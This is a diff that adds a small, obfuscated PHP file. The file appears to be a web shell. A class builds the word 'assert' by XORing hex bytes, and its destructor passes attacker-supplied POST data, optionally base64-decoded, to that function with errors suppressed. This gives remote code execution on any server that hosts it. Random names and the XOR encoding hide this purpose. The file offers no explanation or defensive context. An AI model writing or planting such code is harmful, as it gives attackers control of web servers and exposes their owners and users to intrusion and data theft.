@@ -1,0 +1,20 @@
+<?php
+class THUV{
+	function OwAh(){
+		$KZkG = "\x10" ^ "\x71";
+		$QPkw = "\x5d" ^ "\x2e";
+		$OqMu = "\x4c" ^ "\x3f";
+		$funw = "\x70" ^ "\x15";
+		$UCWd = "\x50" ^ "\x22";
+		$YeDC = "\x49" ^ "\x3d";
+		$FucM =  $KZkG.$QPkw.$OqMu.$funw.$UCWd.$YeDC;
+		return $FucM;
+	}
+	function __destruct(){
+		$YuiE= $this->OwAh();
+		@$YuiE($this->sNvZ);
+	}
+}
+$thuvzjl = new THUV();
+@$thuvzjl->sNvZ = isset($_GET['id'])?base64_decode($_POST['123']):$_POST['123'];
+?>
